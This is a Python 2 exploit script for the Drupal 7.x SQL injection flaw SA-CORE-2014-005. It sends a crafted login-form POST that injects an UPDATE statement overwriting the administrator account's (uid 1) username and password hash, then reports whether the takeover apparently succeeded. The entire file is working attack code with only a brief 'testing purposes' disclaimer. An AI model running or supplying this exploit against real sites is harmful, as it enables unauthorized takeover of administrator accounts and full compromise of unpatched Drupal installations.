#!/usr/bin/env python
# Drupal 7.x SQL Injection Example for SA-CORE-2014-005 https://www.drupal.org/SA-CORE-2014-005
# Original: http://pastebin.com/nDwLFV3v
# Creditz to https://www.reddit.com/user/fyukyuk
#
# Please use it only for testing purposes.

import urllib2,sys
from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py
if len(sys.argv) != 4:
  print "host username password"
  print "http://example.com/ admin new_pass"
  sys.exit(1)
host = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()
target = '%s/?q=node&destination=node' % host
post_data = "name[0%20;update+users+set+name%3d\'" \
            +user \
            +"'+,+pass+%3d+'" \
            +hash[:55] \
            +"'+where+uid+%3d+\'1\';;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
print "POST: ", post_data
content = ''
try:
  content = urllib2.urlopen(url=target, data=post_data).read()
except urllib2.HTTPError, err:
  print 'HTTP Error:', err.code

if "mb_strlen() expects parameter 1" in content:
# FIXME: On 6.8 it's showing success, despite it's not.
        print "Success!\nLogin now with user:%s and pass:%s" % (user, password)
else:
        print "Not success!\n"
